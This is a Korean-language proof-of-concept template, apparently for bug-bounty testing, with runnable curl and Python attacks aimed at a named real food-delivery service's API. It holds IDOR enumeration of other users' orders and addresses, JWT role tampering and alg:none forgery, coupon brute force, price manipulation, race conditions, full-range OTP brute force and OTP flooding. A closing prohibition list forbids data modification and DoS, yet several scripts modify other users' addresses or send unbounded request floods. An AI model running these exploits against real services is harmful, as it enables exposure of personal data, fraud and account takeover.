# PoC 템플릿 — 실행 가능한 샘플 코드

techniques.md에서 명시한 공격 벡터들의 실제 테스트 코드. curl과 Python으로 빠르게 재현 가능하게 작성.

---

## 📌 기본 설정

### curl 기본 옵션
```bash
# 모든 curl 명령어는 다음을 기본으로:
-v              # Verbose (요청/응답 전체 표시)
-H "Content-Type: application/json"  # JSON 타입
-H "User-Agent: Mozilla/5.0 ..."  # 일반 브라우저처럼
--compressed    # 압축 해제
-L              # Redirect 따라가기
```

### Python 기본 import
```python
import requests
import json
from urllib.parse import urljoin

# 세션 유지 (쿠키 자동 관리)
session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 ...',
    'Content-Type': 'application/json'
})
```

---

## 1️⃣ IDOR (권한 없는 객체 접근)

### 주문 데이터 열거
```bash
# 자신의 주문 조회 (성공해야 함)
curl -H "Authorization: Bearer TOKEN" \
  https://baemin.com/api/orders/my

# 응답에서 order_id 확인
# 예: {"order_id": 98765}

# 다른 order_id로 시도
for id in {98760..98770}; do
  echo "=== Testing Order ID: $id ==="
  curl -s -H "Authorization: Bearer TOKEN" \
    https://baemin.com/api/orders/$id | jq .
done
```

### 배송 주소 열거
```bash
# 다른 사용자의 배송 주소 조회
for user_id in {1..100}; do
  result=$(curl -s -H "Authorization: Bearer TOKEN" \
    https://baemin.com/api/users/$user_id/addresses)
  
  # 에러가 아니면 출력
  if echo "$result" | grep -q "address"; then
    echo "[!] User $user_id addresses:"
    echo "$result" | jq .
  fi
done
```

### Python으로 자동화
```python
import requests
import json

def idor_enum(base_url, id_param, token, my_id, test_range=20):
    """
    IDOR 취약점 자동 열거
    """
    headers = {'Authorization': f'Bearer {token}'}
    
    # 먼저 자신의 데이터 확인
    my_url = base_url.format(**{id_param: my_id})
    my_resp = requests.get(my_url, headers=headers)
    
    if my_resp.status_code != 200:
        print(f"[!] Failed to get own data: {my_resp.status_code}")
        return
    
    my_data = my_resp.json()
    print(f"[*] Own data keys: {list(my_data.keys())}")
    
    # 다른 ID 시도
    found = []
    for test_id in range(my_id - test_range, my_id + test_range):
        if test_id == my_id:
            continue
        
        test_url = base_url.format(**{id_param: test_id})
        resp = requests.get(test_url, headers=headers)
        
        if resp.status_code == 200:
            data = resp.json()
            # 실제 데이터인지 확인
            if data.get('id') or data.get('name') or data.get('email'):
                found.append({
                    'id': test_id,
                    'keys': list(data.keys()),
                    'sample': str(data)[:100]
                })
                print(f"[!] IDOR: ID {test_id} accessible!")
                print(f"    Data: {json.dumps(data, indent=2, ensure_ascii=False)}")
    
    return found

# 사용
token = "eyJhbGc..."
idor_enum(
    "https://baemin.com/api/users/{id}/profile",
    "id",
    token,
    my_id=12345,
    test_range=50
)
```

---

## 2️⃣ 수평적/수직적 권한 상승

### 다른 사용자 리소스 수정 시도
```bash
# 자신의 주소 수정 (성공)
curl -X PUT -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"address": "서울시 강남구 테헤란로"}' \
  https://baemin.com/api/users/12345/addresses/1

# 다른 사용자의 주소 수정 시도
curl -X PUT -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"address": "해킹된 주소"}' \
  https://baemin.com/api/users/12346/addresses/1
```

### 관리자 API 접근 시도
```bash
# 일반 사용자 토큰으로 관리자 기능 호출
curl -H "Authorization: Bearer CUSTOMER_TOKEN" \
  https://baemin.com/api/admin/users

curl -H "Authorization: Bearer CUSTOMER_TOKEN" \
  -X POST -H "Content-Type: application/json" \
  -d '{"restaurant_id": 123, "name": "새메뉴", "price": 5000}' \
  https://baemin.com/api/restaurants/123/menu
```

### JWT role 변조
```bash
# 토큰 디코딩 (base64)
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
# eyJ1c2VyX2lkIjoiMTIzNDUiLCJyb2xlIjoiY3VzdG9tZXIifQ
# signature

import base64
import json

token = "eyJhbGc..."
parts = token.split('.')

# 페이로드 디코딩
payload = json.loads(base64.b64decode(parts[1] + '=='))
print(f"[*] Original: {payload}")

# role 변조
payload['role'] = 'admin'
payload['permissions'] = ['admin_access']

# 다시 인코딩 (간단한 테스트용)
new_payload = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')
new_token = parts[0] + '.' + new_payload + '.' + parts[2]

print(f"[*] Modified token: {new_token}")

# 테스트
import requests
resp = requests.get(
    "https://baemin.com/api/admin/users",
    headers={'Authorization': f'Bearer {new_token}'}
)
print(f"[*] Status: {resp.status_code}")
```

---

## 3️⃣ 쿠폰/프로모션 로직 우회

### 쿠폰 중복 적용
```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{
    "restaurant_id": 123,
    "items": [{"id": 456, "qty": 1, "price": 10000}],
    "coupons": ["SAVE20", "SAVE20"],
    "total_price": 6000
  }' \
  https://baemin.com/api/orders/create
```

### 만료된 쿠폰 사용
```bash
# 만료된 쿠폰 코드로 주문
curl -X POST -H "Content-Type: application/json" \
  -d '{
    "coupon_code": "XMAS2023",
    "total_price": 5000
  }' \
  https://baemin.com/api/orders/checkout
```

### 최소 주문금액 우회
```bash
# 프로모션: 30,000원 이상 배송료 무료
# 실제로는 5,000원만 주문

curl -X POST -H "Content-Type: application/json" \
  -d '{
    "items": [{"id": 1, "qty": 1, "price": 5000}],
    "subtotal": 5000,
    "delivery_fee": 0,  # 클라이언트에서 0으로 설정
    "total_price": 5000
  }' \
  https://baemin.com/api/orders/create
```

### 쿠폰 코드 Brute Force
```python
import requests
import threading

def brute_coupon(base_url, coupon_format="WELCOME{:04d}"):
    """쿠폰 코드 브루트포스"""
    found = []
    
    def test_code(code):
        payload = {
            "coupon_code": code,
            "amount": 100
        }
        resp = requests.post(
            f"{base_url}/validate",
            json=payload,
            timeout=5
        )
        
        # 유효한 쿠폰인지 확인
        if resp.status_code == 200 and "valid" in resp.text.lower():
            found.append(code)
            print(f"[!] Valid coupon found: {code}")
    
    # 멀티쓰레딩으로 빠르게 테스트
    threads = []
    for i in range(10000):
        code = coupon_format.format(i)
        t = threading.Thread(target=test_code, args=(code,))
        threads.append(t)
        t.start()
        
        # 동시 요청 제한
        if len(threads) >= 50:
            for t in threads:
                t.join()
            threads = []
    
    for t in threads:
        t.join()
    
    return found

# 사용 (Rate limit 주의!)
# valid_coupons = brute_coupon("https://baemin.com/api/coupons")
```

---

## 4️⃣ 가격 조작

### 클라이언트 가격 변조
```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{
    "items": [
      {"id": 456, "name": "짜장면", "price": 5000, "qty": 2}
    ],
    "subtotal": 10000,
    "delivery_fee": 2000,
    "discount": 0,
    "total_price": 100  # 원래 12000인데 100으로 변조
  }' \
  https://baemin.com/api/orders/checkout
```

### 배송료 음수값 시도
```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{
    "subtotal": 10000,
    "delivery_fee": -5000,  # 음수
    "total_price": 5000
  }' \
  https://baemin.com/api/orders/create
```

---

## 5️⃣ 레이스 컨디션

### 쿠폰 동시 중복 사용
```bash
# 쿠폰: 1회 한정 (SAVE20)
# 동시에 2개 요청 발송

curl -X POST -H "Content-Type: application/json" \
  -d '{"coupon": "SAVE20"}' \
  https://baemin.com/api/orders/1/apply-coupon &

curl -X POST -H "Content-Type: application/json" \
  -d '{"coupon": "SAVE20"}' \
  https://baemin.com/api/orders/2/apply-coupon &

wait
```

### Python으로 레이스 컨디션 테스트
```python
import requests
import threading
import time

def race_condition_test(url, payload_func, num_requests=10):
    """동시 요청으로 레이스 컨디션 테스트"""
    results = []
    
    def make_request():
        try:
            resp = requests.post(url, json=payload_func())
            results.append({
                'status': resp.status_code,
                'success': 'success' in resp.text.lower()
            })
        except Exception as e:
            results.append({'error': str(e)})
    
    # 모든 쓰레드를 준비한 후 동시 실행
    threads = []
    for _ in range(num_requests):
        t = threading.Thread(target=make_request)
        threads.append(t)
    
    # 동시 시작
    for t in threads:
        t.start()
    
    for t in threads:
        t.join()
    
    success_count = sum(1 for r in results if r.get('success'))
    print(f"[*] Total requests: {num_requests}")
    print(f"[!] Successful: {success_count} (예상: 1)")
    
    return results

# 사용
# 같은 쿠폰을 10번 동시에 사용
def coupon_payload():
    return {"coupon_code": "LIMITED_OFFER"}

race_condition_test(
    "https://baemin.com/api/coupons/apply",
    coupon_payload,
    num_requests=10
)
```

---

## 6️⃣ 포인트/리퍼럴 어뷰징

### 음수 포인트로 증가
```bash
curl -X PUT -H "Content-Type: application/json" \
  -d '{"points": -10000}' \
  https://baemin.com/api/users/12345/points
```

### 자기 자신 추천
```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{
    "invitee_phone": "010-1234-5678",
    "invitee_email": "myemail@example.com"
  }' \
  https://baemin.com/api/referral/invite
```

---

## 7️⃣ OTP/인증 우회

### OTP Brute Force
```bash
for otp in {000000..999999}; do
  echo "Trying OTP: $otp"
  curl -s -X POST -H "Content-Type: application/json" \
    -d "{\"otp\": \"$(printf "%06d" $otp)\"}" \
    https://baemin.com/api/auth/verify-otp
done
```

### 응답에서 OTP 노출 확인
```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"phone": "010-1234-5678"}' \
  https://baemin.com/api/auth/send-otp | jq .

# 응답에서 "otp": "123456" 같은 필드 있나?
```

---

## 8️⃣ JWT/토큰 취약점

### alg: none 변조
```python
import base64
import json

def jwt_alg_none_exploit(original_token, new_payload):
    """JWT alg를 none으로 변조"""
    
    # 헤더 변조
    new_header = base64.b64encode(
        json.dumps({"alg": "none", "typ": "JWT"}).encode()
    ).decode().rstrip('=')
    
    # 페이로드 인코딩
    new_payload_b64 = base64.b64encode(
        json.dumps(new_payload).encode()
    ).decode().rstrip('=')
    
    # 서명 제거 (alg:none이므로 서명 불필요)
    exploit_token = f"{new_header}.{new_payload_b64}."
    
    return exploit_token

# 사용
new_payload = {
    "user_id": 12345,
    "role": "admin",
    "email": "attacker@example.com"
}

exploit = jwt_alg_none_exploit("original_token", new_payload)
print(f"Exploit token: {exploit}")

# 테스트
import requests
resp = requests.get(
    "https://baemin.com/api/admin/users",
    headers={'Authorization': f'Bearer {exploit}'}
)
print(f"Status: {resp.status_code}")
```

---

## 9️⃣ Mass Assignment

### 회원가입에 admin 필드 추가
```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{
    "name": "hacker",
    "email": "hack@example.com",
    "password": "password123",
    "is_admin": true,
    "role": "restaurant_owner"
  }' \
  https://baemin.com/api/auth/register
```

---

## 🔟 Rate Limiting 부재

### 무제한 OTP 요청
```bash
for i in {1..1000}; do
  curl -s -X POST -H "Content-Type: application/json" \
    -d '{"phone": "010-1234-5678"}' \
    https://baemin.com/api/auth/send-otp
  echo "[$i] OTP request sent"
done
```

---

## 1️⃣1️⃣ 정보 노출

### 에러 페이지에서 정보 추출
```bash
curl https://baemin.com/api/orders/invalid_id

# 응답에 스택 트레이스, DB 정보 노출?

curl https://baemin.com/api/debug/info

# 개발 엔드포인트에 접근?
```

### CORS 와일드카드 확인
```bash
curl -v https://baemin.com/api/users

# 응답 헤더 확인
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true  ← 위험!
```

---

**⚠️ 절대 금지**
- ❌ 실제 결제/환불 진행
- ❌ 데이터 수정/삭제 (배송주소 변경, 주문 취소 포함)
- ❌ 다른 사용자 계정 탈취
- ❌ 웹셸 업로드
- ❌ DoS/자동화 무한 요청
